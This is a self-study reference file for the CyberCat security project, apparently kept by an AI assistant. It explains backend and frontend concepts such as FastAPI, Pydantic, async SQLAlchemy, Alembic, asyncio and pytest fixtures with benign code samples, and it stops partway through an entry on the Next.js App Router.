# CyberCat — Learning Notes

The operator's growing technical reference. Every concept, framework, library, protocol, design pattern, or systems behavior that has been used while building CyberCat lands here as a self-contained entry. Read it like a textbook you wrote for yourself: re-read entries to cement them, search by name when you forget, build mastery through familiarity.

This file is **maintained by the assistant per `CLAUDE.md` §9 (Teaching Mode)**. It is not a changelog or session log — it is a curated reference. If a concept gets revisited later in a deeper way, the existing entry is updated rather than duplicated, so each topic has one canonical place.

---

## How to use this file

- **Re-read regularly.** This is the durability mechanism. Reading-learners build long-term knowledge through repeated exposure to good explanations, not through being quizzed. Open this file when you have ten quiet minutes and pick an entry.
- **Search by concept name.** Use Ctrl-F. Every entry has a clear `## Heading`.
- **Follow the "Related entries" links** — they form a knowledge graph. Following links is how you build *connections* between concepts, which is what separates "I know the term" from "I understand the system."
- **Notice the "Where else you'll see it" section.** That's the portability check. Every concept here should appear in other tools/projects/standards too — that's how you know it's worth learning, not just CyberCat trivia.

---

## Entry format

Each entry follows the same shape:

- **Intuition** — one sentence "it's like..." for the latch
- **Precise** — 2–4 sentences of technically accurate definition with the real names
- **Why it exists** — the problem it solves, what failed without it
- **Where in CyberCat** — file paths + the specific construct
- **Where else you'll see it** — 2–4 examples outside CyberCat
- **Tradeoffs** — what this choice costs, what alternatives look like
- **Related entries** — links to entries that build on or contrast with this one

---

## Index

### Frameworks & libraries (Python)
- [FastAPI](#fastapi)
- [Pydantic](#pydantic)
- [SQLAlchemy (async)](#sqlalchemy-async)
- [Alembic migrations](#alembic-migrations)
- [Async / await in Python](#async--await-in-python)
- [pytest fixtures](#pytest-fixtures)

### Frameworks & libraries (Frontend)
- [Next.js App Router](#nextjs-app-router)
- [openapi-typescript (typed API client)](#openapi-typescript-typed-api-client)

### Auth & security
- [Bcrypt password hashing](#bcrypt-password-hashing)
- [HMAC session cookies](#hmac-session-cookies)
- [Bearer tokens (API tokens)](#bearer-tokens-api-tokens)
- [JWT (JSON Web Tokens)](#jwt-json-web-tokens)
- [OIDC (OpenID Connect)](#oidc-openid-connect)
- [RBAC (role-based access control)](#rbac-role-based-access-control)

### Telemetry sources
- [sshd auth events](#sshd-auth-events)
- [auditd (EXECVE / SYSCALL / EOE)](#auditd-execve--syscall--eoe)
- [conntrack (connection state tracking)](#conntrack-connection-state-tracking)
- [Wazuh Active Response](#wazuh-active-response)

### Detection
- [Sigma rule format](#sigma-rule-format)
- [MITRE ATT&CK (tactics, techniques, subtechniques)](#mitre-attck-tactics-techniques-subtechniques)
- [Detection-as-Code (DaC)](#detection-as-code-dac)
- [MITRE Caldera adversary emulation](#mitre-caldera-adversary-emulation)
- [ATT&CK technique attribution (set-overlap rule)](#attck-technique-attribution-set-overlap-rule)

### Database (Postgres)
- [ON CONFLICT DO UPDATE / DO NOTHING (upserts and idempotent inserts)](#on-conflict-do-update--do-nothing-upserts-and-idempotent-inserts)
- [Junction tables (many-to-many)](#junction-tables-many-to-many)
- [citext (case-insensitive text)](#citext-case-insensitive-text)
- [Connection invalidation on restart](#connection-invalidation-on-restart)

### Database (Redis)
- [Pub/Sub](#pubsub)
- [SETNX (set-if-not-exists) for dedup](#setnx-set-if-not-exists-for-dedup)
- [TTL (time-to-live) and caching](#ttl-time-to-live-and-caching)
- [Sliding windows for rate detection](#sliding-windows-for-rate-detection)

### Streaming & networking
- [Server-Sent Events (SSE)](#server-sent-events-sse)
- [Docker Compose profiles](#docker-compose-profiles)
- [NXDOMAIN (DNS not found)](#nxdomain-dns-not-found)

### Project-specific patterns
- [Pluggable telemetry adapter pattern](#pluggable-telemetry-adapter-pattern)
- [Tail-and-checkpoint pattern](#tail-and-checkpoint-pattern)
- [Action classification (auto-safe / suggest-only / reversible / disruptive)](#action-classification-auto-safe--suggest-only--reversible--disruptive)
- [Explainability contract](#explainability-contract)
- [Plain-language summary layer](#plain-language-summary-layer)
- [Recommendation engine (two-level mapping)](#recommendation-engine-two-level-mapping)
- [Fetch-on-start agent enrollment](#fetch-on-start-agent-enrollment)

### Verification
- [Smoke tests vs unit tests vs integration tests](#smoke-tests-vs-unit-tests-vs-integration-tests)
- [p50 / p95 / p99 percentiles](#p50--p95--p99-percentiles)
- [Load harness (rate, duration, transport errors)](#load-harness-rate-duration-transport-errors)
- [Bash sourcing & shared shell libraries](#bash-sourcing--shared-shell-libraries)
- [Coverage scorecard methodology](#coverage-scorecard-methodology)

---

## Entries

### Frameworks & libraries (Python)

#### FastAPI
*Introduced: Phase 1 · Category: Frameworks (Python)*

**Intuition:** FastAPI is a Python web framework that lets you write HTTP endpoints as ordinary Python functions, with type hints doing double duty as input validation and OpenAPI documentation.

**Precise:** FastAPI is built on Starlette (an ASGI — Asynchronous Server Gateway Interface — toolkit) and Pydantic. You declare a route with `@router.post("/incidents")`, and the function's parameter types are validated against the request body, query string, and path parameters automatically. The same type hints generate an OpenAPI 3 spec at `/openapi.json`, which CyberCat exports and feeds to the frontend's typed client generator. Dependencies (auth checks, DB sessions) are declared via `Depends(...)` and FastAPI assembles them per request.

**How it works (under the hood):**

**ASGI** is the protocol underneath. An ASGI app is a callable with the signature `async def app(scope, receive, send)`. `scope` is a dict describing the request (HTTP method, path, headers); `receive` is an async function that yields the next request body chunk; `send` is an async function that emits response chunks. The ASGI server (uvicorn, in CyberCat) calls your app once per HTTP request and runs everything inside a single asyncio event loop. FastAPI wraps this raw protocol with router, validation, and DI machinery — but the ASGI signature is what's actually being called.

The **request lifecycle** for a route like `POST /v1/incidents/{id}/transitions`:

1. **uvicorn** accepts the TCP connection, parses HTTP headers, builds the `scope` dict, calls `app(scope, receive, send)`.
2. **Middleware stack** runs in order (CORS, auth-cookie parser, request-id injector). Each middleware is a wrapper that can short-circuit (return early) or call the inner app.
3. **Router** matches the URL path + method against registered routes. The path parameter `{id}` becomes a string pulled from the URL.
4. **Dependency resolution** runs the dep tree. FastAPI introspects your handler's signature with `inspect.signature(handler)`. For each parameter, it looks at the annotation: is it a `Depends(...)` (resolve recursively), a path/query/header param (extract from `scope`), or otherwise a body param (consume `receive` and validate as JSON-then-Pydantic)?
5. **Handler runs** with all params resolved. Returns a Pydantic model.
6. **Response serialization** — Pydantic's `model_dump_json()` produces the JSON body. FastAPI builds an HTTP response and emits it via `send`.

A concrete example showing all the pieces:

```python
@router.post("/incidents/{id}/transitions", response_model=IncidentDetail)
async def transition_incident(
    id: UUID,                                          # path param
    body: TransitionRequest,                           # request body (Pydantic)
    db: AsyncSession = Depends(get_db),                # dependency
    user: User = Depends(require_analyst),             # dep that depends on get_current_user
) -> IncidentDetail:
    incident = await db.get(Incident, id)
    incident.status = body.new_status
    await db.commit()
    return IncidentDetail.from_orm(incident)
```

When this is called, FastAPI walks the params: `id` from the URL, `body` from the JSON request, `db` by calling `get_db()` (which itself yields a session), `user` by calling `require_analyst` (which calls `get_current_user` first, then checks the role). If validation fails on `body`, FastAPI raises 422 with field-level errors before your code runs. If `require_analyst` raises 403, your code never runs.

**Dependency caching:** within one request, each `Depends(get_db)` resolves once and is cached. The second handler dep that asks for `Depends(get_db)` gets the same session — that's how FastAPI guarantees one DB transaction per request.

**OpenAPI generation** uses the same `inspect.signature` walk to build a JSON schema for every route's params and response model. This happens once at app startup, not per request. The result is served at `GET /openapi.json` — that's the file `openapi-typescript` reads.

**Why it exists:** Pre-FastAPI Python web frameworks (Flask, Django) made you write your own validation, your own OpenAPI docs, and your own dependency-injection plumbing. FastAPI collapses all three into the type system. The result: fewer bugs at the request boundary, types that stay in sync with docs, and a frontend that can be regenerated from the backend's contract automatically.

**Where in CyberCat:** `backend/app/main.py` (app construction), `backend/app/api/v1/*` (routers), `backend/app/auth/dependencies.py` (`require_user`, `require_analyst` deps).

**Where else you'll see it:** It powers most modern Python services that aren't legacy Django (Microsoft, Uber, Netflix internal tools). Sentry, Replicate, and Anthropic all use it for parts of their public APIs. The "type hint as validation" pattern also appears in Rust's `axum`, TypeScript's `Hono`, and Go's `huma`.

**Tradeoffs:** Async-first design means sync code (e.g., a long CPU loop) blocks the event loop and tanks throughput — you have to reach for `asyncio.to_thread()` or break the work into chunks. The dependency-injection system is elegant but new — if you've never seen DI before, the `Depends(...)` chain takes a session to internalize.

**Related entries:** [Pydantic](#pydantic) · [Async / await in Python](#async--await-in-python) · [openapi-typescript](#openapi-typescript-typed-api-client)

---

#### Pydantic
*Introduced: Phase 1 · Category: Frameworks (Python)*

**Intuition:** Pydantic is "Python dataclasses, but they validate themselves at runtime against the type annotations you wrote." If you say a field is `int`, Pydantic refuses to accept a string and tells you exactly which field failed.

**Precise:** A Pydantic model is a class inheriting from `BaseModel` whose attributes are typed. On instantiation (or on `model_validate(json_dict)`), Pydantic walks the field types — including nested models, `Optional[X]`, `Literal["new", "triaged"]`, `list[Event]` — and either constructs the object or raises a `ValidationError` listing every failure with a JSON-pointer path. CyberCat is on Pydantic v2, which moved the validation core to Rust for ~10× speedup.

**How it works (under the hood):**

Pydantic does its work in **two phases**:

**Phase 1 — schema build (at class definition time, runs once):** when Python imports `class IncidentSummary(BaseModel): ...`, Pydantic's metaclass walks the class annotations, builds a **validation schema** (a tree of validator functions, one per field), and a **serialization schema** (the inverse — how to dump a populated model back to JSON). In v2 these schemas are compiled to a Rust representation in `pydantic-core`. This is why class definitions can take a moment but instantiation is fast.

**Phase 2 — validation (at every `Model(**data)` or `Model.model_validate(data)`):** Pydantic invokes the compiled schema. For each field it: (1) extracts the value from the input dict by alias or field name, (2) runs the type-coercion / validation chain (`int` accepts `"42"` → `42` with default coercion; strict mode forbids), (3) runs any `@field_validator` you defined, (4) collects the validated value or appends an error.

A concrete example:

```python
from pydantic import BaseModel, field_validator
from typing import Literal

class TransitionRequest(BaseModel):
    new_status: Literal["triaged", "investigating", "contained", "resolved", "closed"]
    reason: str | None = None

    @field_validator("reason")
    @classmethod
    def reason_not_empty(cls, v: str | None) -> str | None:
        if v is not None and v.strip() == "":
            raise ValueError("reason cannot be empty whitespace")
        return v

# At runtime:
TransitionRequest(new_status="triaged")                     # OK, reason=None
TransitionRequest(new_status="bogus")                       # ValidationError: not in Literal
TransitionRequest(new_status="triaged", reason="   ")       # ValidationError: empty whitespace
```

**Validation error structure** is a list of dicts:

```json
[
  {"loc": ("body", "new_status"), "msg": "Input should be 'triaged' or ...", "type": "literal_error"},
  {"loc": ("body", "reason"), "msg": "reason cannot be empty whitespace", "type": "value_error"}
]
```

The `loc` tuple is the JSON path. FastAPI catches this and emits an HTTP 422 with the error list in the response body.

**Serialization** is the reverse: `model.model_dump()` returns a Python dict (with default field aliasing); `model.model_dump_json()` produces a JSON string. The ORM-bridge pattern `Model.model_validate(orm_obj, from_attributes=True)` lets you convert SQLAlchemy rows to Pydantic models without an intermediate dict.

**Discriminated unions** are how Pydantic handles polymorphic JSON cleanly:

```python
class TagAction(BaseModel):
    kind: Literal["tag_incident"]
    tags: list[str]

class BlockObservableAction(BaseModel):
    kind: Literal["block_observable"]
    value: str

ActionRequest = Annotated[
    TagAction | BlockObservableAction,
    Field(discriminator="kind")
]
```

Pydantic uses the `kind` field to pick the right model — no manual `if action_type == "...":` ladder.

**Why it exists:** Without it, every API endpoint has to write defensive `if not isinstance(x, str): raise ...` ladders. Pydantic centralizes the schema definition: one model, used as the FastAPI request body type, the response type, the OpenAPI schema, and the database row shape (via SQLAlchemy adapter patterns).

**Where in CyberCat:** `backend/app/schemas/*` (`Incident`, `Event`, `RecommendedAction`, `ErrorEnvelope`), `backend/app/auth/schemas.py` (login/token request models). Every FastAPI route signature is implicitly a Pydantic boundary.

**Where else you'll see it:** It's the schema layer of LangChain, Instructor, OpenAI's structured outputs, modern Django alternatives, and most internal APIs at startups. The "models as the source of truth" pattern also shows up in TypeScript (`zod`), Rust (`serde`), and Go (`go-validator`).

**Tradeoffs:** Validation costs CPU — for high-throughput hot loops you sometimes bypass it (e.g., the agent's tail loops parse with regex, not Pydantic, then build models only at the API boundary). The error messages can be verbose; for user-facing APIs you usually wrap them in your own `ErrorEnvelope`.

**Related entries:** [FastAPI](#fastapi) · [SQLAlchemy (async)](#sqlalchemy-async)

---

#### SQLAlchemy (async)
*Introduced: Phase 1 · Category: Frameworks (Python)*

**Intuition:** SQLAlchemy is a Python ORM (Object-Relational Mapper) — it lets you write `session.add(Incident(...))` instead of `INSERT INTO incidents (...) VALUES (...)`, and `select(Incident).where(...)` instead of raw SQL.

**Precise:** SQLAlchemy has two layers: **Core** (a Pythonic SQL builder) and **ORM** (declarative mapping of Python classes to tables, with relationships, lazy-loading, and a session-based unit-of-work pattern). CyberCat uses the **async ORM** (added in SA 1.4): `AsyncSession`, `async with engine.begin()`, `await session.execute(stmt)`. The session tracks dirty objects in memory and flushes them in a single transaction on `await session.commit()`.

**How it works (under the hood):**

There are **three core objects** that get conflated all the time. Knowing the difference is the single most useful piece of SQLAlchemy knowledge:

1. **Engine** — a process-wide handle to the database. Holds the **connection pool**, the dialect (Postgres / MySQL / etc.), and the URL. Created once at app startup: `create_async_engine("postgresql+asyncpg://...")`. Cheap to share. *Does not* hold an open connection by itself.
2. **Connection** — a single TCP connection to the database, plus an open transaction context. Acquired from the engine's pool on demand. Has methods like `await conn.execute(stmt)` that send raw SQL.
3. **Session** — the **unit of work**: an in-memory workspace tied to one Connection where you stage changes (`session.add(incident)`, `incident.status = "closed"`). The session tracks every change and flushes them as one transaction on `commit()`.

**The unit-of-work pattern step-by-step:**

```python
async with AsyncSession(engine) as session:
    incident = await session.get(Incident, incident_id)   # SELECT ... WHERE id = ...
    incident.status = "investigating"                      # in memory only
    incident.summary = "Two failed logins, one success"   # in memory only
    new_note = Note(incident_id=incident.id, body="...")
    session.add(new_note)                                  # staged for INSERT
    await session.commit()                                 # one transaction: UPDATE + INSERT
```

What happens internally:

- `session.get(Incident, id)` — issues `SELECT * FROM incidents WHERE id = $1`, materializes the row into an `Incident` Python object, registers it in the session's **identity map** (a dict of `(Incident, id) → object`).
- `incident.status = "investigating"` — the ORM-attribute setter records the field as **dirty** in the session's tracking dict. No SQL yet.
- `session.add(new_note)` — adds the new object to a **pending** set.
- `await session.commit()` — runs **flush** first (emits SQL UPDATE for dirty objects, INSERT for pending objects, in dependency order), then COMMITs the transaction.

**Identity map magic:** if you call `session.get(Incident, id)` a second time within the same session, you get the *same Python object* back — no second SQL query. This makes "load incident, mutate, save" feel natural without having to thread the object through every function.

**Async details:** the async stack is a thin wrapper. `AsyncSession` wraps a sync `Session` and schedules its blocking calls onto a **greenlet** (a lightweight thread-like unit) so the event loop stays unblocked. The actual driver (`asyncpg`) speaks Postgres' wire protocol natively in async. Net effect: `await session.execute(stmt)` doesn't block the event loop while the DB is working.

**The N+1 query problem** — the most famous SQLAlchemy footgun:

```python
incidents = (await session.execute(select(Incident).limit(50))).scalars().all()
for inc in incidents:
    print(len(inc.detections))   # each access fires a separate SELECT for that incident's detections
# Result: 1 query for the incidents + 50 queries for detections = 51 queries.
```

Fix with **eager loading**:

```python
stmt = select(Incident).options(selectinload(Incident.detections)).limit(50)
# selectinload runs ONE follow-up query: SELECT * FROM detections WHERE incident_id IN (...)
# Total: 2 queries for any number of incidents.
```

This is exactly the kind of work Phase 19 §A7 was about — finding all the N+1s on the hot routes.

**Why it exists:** Hand-rolling SQL across dozens of endpoints leads to inconsistent error handling, missing transaction boundaries, and SQL-injection risk if you're not careful with parameter binding. The ORM gives you typed models, automatic parameter binding (no injection), declarative joins, and per-request transaction management via FastAPI dependencies.

**Where in CyberCat:** `backend/app/db/models.py` (all table classes — `Incident`, `Event`, `Entity`, `Action`, …), `backend/app/db/session.py` (`get_db` async dependency), every router uses `db: AsyncSession = Depends(get_db)`.

**Where else you'll see it:** SQLAlchemy is the de facto Python ORM (Reddit, Yelp, Dropbox have used it). Equivalents in other ecosystems: Prisma (Node), Diesel (Rust), GORM (Go), ActiveRecord (Rails).

**Tradeoffs:** Lazy-loading relationships can silently issue an extra query per row — the famous "N+1 query problem" (fetching one incident triggers N follow-up queries to load each of its N detections, instead of one JOIN). Phase 19 §A7 was specifically about hunting these down on the hot routes. The cure is `selectinload(...)` or `joinedload(...)` to eager-load relationships in one query.

**Related entries:** [Alembic migrations](#alembic-migrations) · [ON CONFLICT DO UPDATE](#on-conflict-do-update--do-nothing-upserts-and-idempotent-inserts) · [Connection invalidation on restart](#connection-invalidation-on-restart)

---

#### Alembic migrations
*Introduced: Phase 1 · Category: Frameworks (Python)*

**Intuition:** Alembic is the version control for your database schema. Every change to the tables (add a column, create an index) lives as a numbered Python file; `alembic upgrade head` walks through them in order and applies the ones the database hasn't seen yet.

**Precise:** Alembic is the migration tool that ships with SQLAlchemy. Each migration file (e.g., `0008_add_incident_summary.py`) defines `upgrade()` and `downgrade()` functions using the `op.*` API (`op.add_column`, `op.create_index`, `op.execute(raw_sql)`). A hidden `alembic_version` table in the database records the latest applied revision; `alembic upgrade head` computes the diff and runs the missing `upgrade()`s in order. Migrations form a chain: each file declares its parent (`down_revision = "0007_..."`) so the order is explicit, not alphabetical.

**How it works (under the hood):**

**File anatomy.** A migration file looks like this:

```python
# backend/alembic/versions/0008_add_incident_summary.py
"""add incident.summary column"""

revision = "0008_add_incident_summary"
down_revision = "0007_phase14_auth"
branch_labels = None
depends_on = None

from alembic import op
import sqlalchemy as sa

def upgrade() -> None:
    op.add_column("incidents", sa.Column("summary", sa.Text(), nullable=True))

def downgrade() -> None:
    op.drop_column("incidents", "summary")
```

`revision` is this file's ID; `down_revision` points to its parent. Alembic walks the chain by following `down_revision` pointers, building an in-memory directed graph.

**The `alembic_version` table.** Created on the first migration, it has a single column (`version_num text`) and contains exactly one row — the ID of the latest applied migration. That's how Alembic knows "where are we?" without scanning the file system or the schema itself.

**What `alembic upgrade head` does, step-by-step:**

1. Loads `alembic.ini` and `env.py` (the bootstrap — connects to the DB and registers your model metadata).
2. Reads the current row from `alembic_version` — call it `current`.
3. Walks the migration files, follows `down_revision` pointers, finds **head** (the latest revision with no children).
4. Computes the path from `current` to `head` (a list of revisions to apply in order).
5. For each pending revision: opens a transaction, runs `upgrade()`, updates `alembic_version` to that revision's ID, commits.
6. If any `upgrade()` raises, the transaction rolls back — `alembic_version` stays at the last-successful migration. Re-running `alembic upgrade head` resumes from there.

**The `op` API** is a thin wrapper over SQLAlchemy DDL (Data Definition Language — `CREATE TABLE`, `ALTER COLUMN`, etc.). Common ops:

```python
op.create_table("blocked_observables",
    sa.Column("id", postgresql.UUID(as_uuid=True), primary_key=True),
    sa.Column("kind", sa.Text(), nullable=False),
    sa.Column("value", sa.Text(), nullable=False),
    sa.Column("active", sa.Boolean(), nullable=False, server_default=sa.text("true")),
)
op.create_index("ix_blocked_obs_kind_value", "blocked_observables", ["kind", "value"], unique=True)
op.add_column("incidents", sa.Column("summary", sa.Text(), nullable=True))
op.execute("UPDATE incidents SET summary = rationale WHERE summary IS NULL")  # raw SQL escape hatch
```

**Autogenerate** (`alembic revision --autogenerate -m "add foo"`) compares the current DB schema (introspected) to your SQLAlchemy ORM models (loaded from `env.py`) and writes a migration with the diff. It's a starting point — *always* read the generated file before committing; autogen misses things like enum value reorderings, custom CHECK constraints, and operations that need data backfills.

**Where in CyberCat:** `backend/alembic/versions/` (the chain — `0001` through `0008` as of Phase 18). `start.sh` runs `alembic upgrade head` before starting uvicorn so the schema is always current before the app accepts requests.

**Where else you'll see it:** Every database-backed Python service uses Alembic or a competitor — Django has its own migrations, Rails has ActiveRecord migrations, Node has Knex / Prisma migrations, Go has `golang-migrate`. The pattern is universal.

**Tradeoffs:** Migrations must be **forward-compatible during deploy** — if you remove a column the running code still reads, requests crash mid-deploy. Real-world dance: add column → deploy code that writes both → backfill → deploy code that reads new only → remove old column. CyberCat is a single-instance project so this is mostly theoretical, but the discipline matters once you have replicas.

**Related entries:** [SQLAlchemy (async)](#sqlalchemy-async)

---

#### Async / await in Python
*Introduced: Phase 1 · Category: Frameworks (Python)*

**Intuition:** `async`/`await` lets a single Python process juggle thousands of slow I/O operations (DB queries, HTTP calls, file reads) by *suspending* a function while it waits and running other functions in the meantime — instead of blocking on each one in turn.

**Precise:** A function declared `async def` returns a *coroutine* — an object representing a paused computation. The `await some_coroutine()` expression yields control back to the event loop, which can then resume any other coroutine that's ready. The event loop (`asyncio.get_event_loop()` under the hood, run by uvicorn for FastAPI) is the scheduler. Crucially, async only helps for **I/O-bound** work — CPU-bound code (a tight loop computing hashes) blocks the event loop until it finishes, starving every other request.

**How it works (under the hood):**

**A coroutine is a generator with extra steps.** Under the hood, `async def` is implemented using Python's existing **generator** machinery. A generator (the `yield` keyword) is a function that can pause and resume — it returns a generator object whose `next()` runs until the next `yield` and saves the local-variable state. A coroutine is the same machinery with two additions: an `__await__` method that drives the generator, and the `await` keyword that bridges between coroutines.

```python
async def fetch_user(user_id: int) -> User:
    # When this hits `await`, control RETURNS to the event loop.
    # The local stack frame is saved. The loop can run other tasks.
    # When the awaited thing is ready, the loop calls back here and resumes.
    row = await db.fetch_one("SELECT ... WHERE id = ?", user_id)
    return User(**row)
```

**The event loop** is a literal `while True:` loop that does roughly this:

```python
# Pseudocode for what asyncio's loop does internally:
while True:
    # 1. Run all callbacks scheduled for "right now" (loop.call_soon)
    run_ready_callbacks()

    # 2. Compute timeout = time until next scheduled callback (loop.call_later)
    timeout = next_scheduled_time - now()

    # 3. Block on selectors (epoll/kqueue/IOCP) waiting for I/O readiness
    #    OR a timer expiry, whichever comes first
    events = selector.select(timeout)

    # 4. For each socket that's now readable/writable, schedule the callback
    #    that was registered for that socket
    for ev in events:
        ev.callback()
```

`epoll` (Linux) / `kqueue` (BSD/macOS) / `IOCP` (Windows) are kernel facilities for "tell me which of these N file descriptors became readable, but block until at least one does" — without them, you'd be busy-waiting and burning CPU. This is the core of why async scales to thousands of connections.

**Tasks vs coroutines.** A bare coroutine is just a paused computation; nothing schedules it. To put it on the event loop you wrap it in a **task**:

```python
task = asyncio.create_task(fetch_user(42))   # scheduled NOW, runs in background
result = await task                          # await its completion
```

Or run several concurrently:

```python
users = await asyncio.gather(
    fetch_user(1), fetch_user(2), fetch_user(3),
)
# All three start at once; gather returns when all three finish.
```

**What blocks the loop (the most important rule):** any **synchronous** code that takes meaningful time stops every other coroutine. A `time.sleep(1)` inside an async function freezes the entire server for 1s. So does a `requests.get(...)` (sync HTTP), a `psycopg2.execute(...)` (sync DB driver), a `hashlib.sha256(big_blob).hexdigest()` (CPU-bound — short ones fine, long ones not). The fixes:

- For I/O: use the async equivalent (`httpx.AsyncClient`, `asyncpg`, `aiofiles`).
- For CPU-bound work: `await asyncio.to_thread(blocking_fn, args)` — runs the function on a thread pool.

**Concrete CyberCat example — the SSE bus:**

```python
# backend/app/streaming/bus.py (simplified)
class EventBus:
    def __init__(self):
        self._queues: dict[int, asyncio.Queue] = {}

    async def subscribe(self, conn_id: int) -> AsyncIterator[dict]:
        q = asyncio.Queue(maxsize=128)
        self._queues[conn_id] = q
        try:
            while True:
                msg = await q.get()             # SUSPEND until something is published
                yield msg                        # send to the SSE response stream
        finally:
            del self._queues[conn_id]

    async def fanout(self, msg: dict) -> None:
        for q in self._queues.values():
            await q.put(msg)                     # wakes up every subscriber's `await q.get()`
```

When a publish happens, `q.put()` resolves the `q.get()` of every waiting subscriber, which causes each of their `subscribe()` coroutines to resume and yield the message. One publisher → N subscribers, all in one process, no threads.

**Why it exists:** A single thread can hold thousands of open sockets; spawning thousands of OS threads or processes does not scale. Async lets one process handle high concurrency for I/O-heavy workloads (web APIs, message queues, database servers) at low memory cost. It's the "C10k problem" solution that node.js popularized and Python adopted.

**Where in CyberCat:** Every route handler is `async def`. The DB layer uses `AsyncSession` and `await session.execute(...)`. Redis is `redis.asyncio`. The Wazuh poller and the agent's HTTP shipper both use `httpx.AsyncClient`. SSE streaming (`backend/app/streaming/bus.py`) is built around `asyncio.Queue`.

**Where else you'll see it:** node.js (the original mainstream async runtime), Go's goroutines (different model — green threads, not coroutines), Rust's `tokio`, C#'s `async/await`. The language syntax differs; the underlying "non-blocking I/O + scheduler" idea is the same.

**Tradeoffs:** A single `time.sleep(5)` or sync `requests.get(...)` in an async route blocks every other request for 5 seconds — async correctness is **infectious** ("once you go async, every layer must be async"). Debugging is harder: stack traces span the event loop and don't always point at the awaiting function. Phase 19's `safe_redis` work was partly about this — slow DNS lookups blocking the event loop on Redis kills.

**Related entries:** [FastAPI](#fastapi) · [SQLAlchemy (async)](#sqlalchemy-async) · [Server-Sent Events (SSE)](#server-sent-events-sse)

---

#### pytest fixtures
*Introduced: Phase 1 · Category: Frameworks (Python)*

**Intuition:** A pytest fixture is a piece of setup that gets handed to your test as a parameter. Want a database? Declare `def test_x(db):` and the `db` fixture builds one before your test runs and tears it down after.

**Precise:** Fixtures are functions decorated with `@pytest.fixture`. When pytest sees a test function whose parameter name matches a fixture name, it calls the fixture (resolving its own dependencies recursively) and passes the return value. Scope (`function` / `class` / `module` / `session`) controls how often the fixture is rebuilt. `yield` in a fixture splits setup (before yield) from teardown (after yield), which is how DB transactions get rolled back at the end of each test.

**How it works (under the hood):**

**Discovery.** When pytest starts, it walks `conftest.py` files from the rootdir down to each test file, registering every `@pytest.fixture`-decorated function in a per-directory **fixture registry**. Tests inherit fixtures from every `conftest.py` above them — that's why no imports are needed.

**Resolution at test time.** When pytest is about to run `def test_foo(db, client):`, it does:

1. Inspect the test function's signature → params are `db` and `client`.
2. For each param, look up the fixture by name in the registry.
3. Resolve each fixture's own dependencies (recursively — `client` may depend on `db`).
4. Call each fixture function in dependency order, cache the return value at the fixture's scope.
5. Pass the cached values to the test as keyword arguments.
6. Run the test.
7. After the test (or scope boundary), run teardown for fixtures that used `yield`.

**The yield pattern step-by-step:**

```python
@pytest.fixture
def db_session(db_engine):
    # SETUP — runs before the test
    connection = db_engine.connect()
    transaction = connection.begin()                    # open transaction
    session = Session(bind=connection)
    try:
        yield session                                   # ← TEST RUNS HERE
    finally:
        session.close()
        transaction.rollback()                          # TEARDOWN — undo all writes
        connection.close()
```

The `yield` line is the boundary. Pytest pauses the fixture generator, runs the test using the yielded value, then resumes the generator (which runs the `finally:` block). This pattern is how every test gets a clean DB without polluting the next one — the test's writes are real, but they're rolled back as soon as the test ends.

**Scopes** control fixture lifetime:

| Scope | Lifetime | Use for |
|---|---|---|
| `function` (default) | Once per test | Per-test isolation (DB sessions, temp dirs) |
| `class` | Once per test class | Shared setup across a related group |
| `module` | Once per `.py` file | Module-level state (mock server) |
| `session` | Once for the entire pytest run | Expensive setup (engine, app instance) |

**Concrete chain in CyberCat:**

```python
# backend/tests/conftest.py
@pytest.fixture(scope="session")
def db_engine():
    engine = create_engine(TEST_DB_URL)
    Base.metadata.create_all(engine)
    yield engine
    engine.dispose()

@pytest.fixture(scope="function")
def db_session(db_engine):
    # Per-test transaction rollback (shown above)
    ...

@pytest.fixture(scope="function")
def client(db_session):
    app.dependency_overrides[get_db] = lambda: db_session
    with TestClient(app) as c:
        yield c
    app.dependency_overrides.clear()
```

Now `def test_x(client):` gets a TestClient where every DB call inside the request goes through the per-test session that will be rolled back after the test. Total isolation, no pollution.

**parametrize** is the other heavy-use feature — runs the same test multiple times with different inputs:

```python
@pytest.mark.parametrize("status,expected", [
    ("new", True), ("triaged", True), ("closed", False),
])
def test_can_transition(status, expected):
    assert can_transition(status) is expected
```

Pytest reports each as a separate test (`test_can_transition[new-True]`, etc.), so a single failure pinpoints which input broke.

**Why it exists:** The classic alternative — a `setUp()` / `tearDown()` method on a test class — couples tests to inheritance and forces every test to use the same setup. Fixtures are composable (`db` depends on `engine`, `engine` depends on `tmpdir`), per-test-opt-in, and much easier to share across test files via `conftest.py`.

**Where in CyberCat:** `backend/tests/conftest.py` — `db_engine`, `db_session` (rolls back per test), `client` (FastAPI `TestClient`), `seed_user`, `seed_incident`. `agent/tests/conftest.py` — sample log fixtures, mock shipper. Smoke scripts use a different pattern (live stack, real HTTP).

**Where else you'll see it:** Same pattern in Go (`testing.T` cleanup), Rust (`rstest` crate), JavaScript (Vitest's `vi.mock` + `beforeEach` is closest). The dependency-injection-for-tests idea is universal even when not called "fixtures."

**Tradeoffs:** Fixture chains can become magic — a test fails and it's not obvious which fixture set up the broken state. `pytest --setup-show` traces this. Session-scoped fixtures shared across tests can leak state between tests (the reason CyberCat uses function-scoped DB sessions with rollback).

**Related entries:** [Smoke tests vs unit tests vs integration tests](#smoke-tests-vs-unit-tests-vs-integration-tests)

---

### Frameworks & libraries (Frontend)

#### Next.js App Router
*Introduced: Phase 12 (frontend) · Category: Frameworks (Frontend)*

**Intuition:** Next.js's App Router is a file-system-based routing system where `app/incidents/[id]/page.tsx` automatically becomes the route `/incidents/<some-id>`. Each `page.tsx` is by default a React Server Component (RSC) — it runs on the server, fetches data, and ships rendered HTML + a smaller JS payload to the browser.

**Precise:** Next.js 15's App Router (vs the older `pages/` router) maps directories to routes. Special files: `page.tsx` (the route), `layout.tsx` (wraps children), `loading.tsx` (Suspense boundary), `error.tsx` (error boundary). Components are **Server Components by default** — they execute on the server, can `await` data directly, and never ship to the client. Adding `"use client"` at the top of a file marks it as a Client Component, sent to the browser for interactivity (`useState`, `onClick`, event listeners). The mental model: server components = the data fetcher, client components = the interactive bits.

**How it works (under the hood):**

**The two component worlds.** Every component in `app/` is one of two kinds:

- **Server Component (SC)** — runs on the server during render. Can `await` (so data fetching is just `const data = await fetch(...)`). Has no React hooks (`useState`, `useEffect` would make no sense — there's no client). Imports do not get bundled into the browser JS.
- **Client Component (CC)** — runs in the browser after hydration. Has all the interactivity (state, event handlers). Marked by `"use client"` at the top of the file. Imports DO get bundled into the browser.

The boundary is enforced at build time. A SC can import a CC (the CC's code is bundled separately and shipped to the browser). A CC can render an SC only if you pass it as `children` (the SC was already rendered to its serializable output server-side). A CC cannot directly *import* an SC.

